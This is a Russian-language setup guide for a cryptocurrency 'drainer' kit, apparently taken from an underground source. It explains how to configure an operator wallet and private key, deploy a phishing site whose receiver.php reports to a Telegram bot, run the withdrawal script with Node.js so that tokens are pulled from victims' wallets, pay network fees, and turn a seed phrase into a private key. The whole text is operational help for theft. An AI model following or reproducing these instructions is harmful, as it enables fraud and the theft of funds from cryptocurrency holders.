Для начала настраиваем софт для списывание монет-токенов, открываем файл в архиве Token drainer.js сверху заполняем три поля: адрес кошелька, приватный ключ кошелька (нужен для вывода токенов с кошельков жертвы) и адрес сайта, где будет стоять сам дрейнер (как в примере, с http или https)

Сохраняем файл, затем скачиваем Node JS (версия LTS), запускать можно либо на Windows, либо на Linux

После установки Node JS, открываем консоль, вводим команду для перехода в папку, где у нас лежит обработчик

cd путь/к/папке/обработчика

Затем прописываем в консоль: npm install

Ждём пока библиотеки установятся и всё, на этом обработчик готов

Теперь настраиваем сайт, а именно открываем файл drainer.js в папке assets/js и заменяем receiver_address на свой адрес, который указали в обработчике, они должны быть одинаковые, сохраняем и закрываем

Потом открываем receiver.php в корне сайта, вписываем туда данные тг бота и чат айди,  сохраняем, теперь заливаем сайт на хостинг и проверяем работоспособности

Если всё работает, снова идем в консоль, где настраивали софт для списывание монет-токенов, и запускаем его, чтобы он выводил подтвержденные токены, команда:

node drainer.js

Должна появится строчка "Drainer by XM8WyK", главное чтобы не появилось никаких ошибок, если их нет - всё окей

Плюс чтобы токены успешно выводились надо будет закинуть туда немного ETH и BNB, примерно по 10 - 15 долларов в каждую из сетей, эти деньги пойдут на комиссию при выводе токенов


SEED.RAR

Это чтоб узнать свой приват ключ от кошелька

открываешь convert.js, на первой строчке вставляешь SEED-фразу (это которая набор из 12 или 24 слов), сохраняешь

Потом запускаешь через start.bat, там будет приватный ключ, который начинается с 0x, он выглядит так же, как адрес кошелька, но чуть длиннее

Для дрейнера лучше создать новый пустой кошелек, а не использовать личный